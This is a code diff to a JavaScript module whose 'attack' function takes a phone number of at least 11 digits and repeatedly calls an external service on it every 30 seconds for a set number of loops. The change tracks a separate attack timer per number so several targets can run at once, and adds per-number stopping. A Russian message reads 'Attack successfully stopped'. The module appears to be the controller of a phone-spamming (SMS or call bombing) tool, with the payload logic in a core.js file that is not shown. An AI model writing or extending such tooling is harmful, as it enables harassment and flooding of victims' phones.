@@ -1,5 +1,5 @@
 const service = require("./core.js")
-let interval
+var current_attacks = {};
 
 module.exports.attack = function(number, loop){
     if(!Number(number) || number.toString().length < 11){
@@ -22,20 +22,20 @@ module.exports.attack = function(number, loop){
         }
 	count = 0;
     
-	interval = setInterval(async function(){
-      service.start(number)
-        	count++;
-            	if(count == loop){
-            		clearInterval(interval);
-            	}
-		}, 30000);
+    current_attacks[number] = setInterval(async function(){
+        service.start(number)
+              count++;
+                  if(count == loop){
+                      clearInterval(current_attacks[number]);
+                  }
+          }, 30000);
     }
-        return result;
+    return result;
 }
 
-module.exports.stop = function(){
-   if(interval){
-      clearInterval(interval)
+module.exports.stop = function(number){
+   if(current_attacks[number]){
+      clearInterval(current_attacks[number])
      result = {
        success: true,
        text: "Атака успешно прекращена"
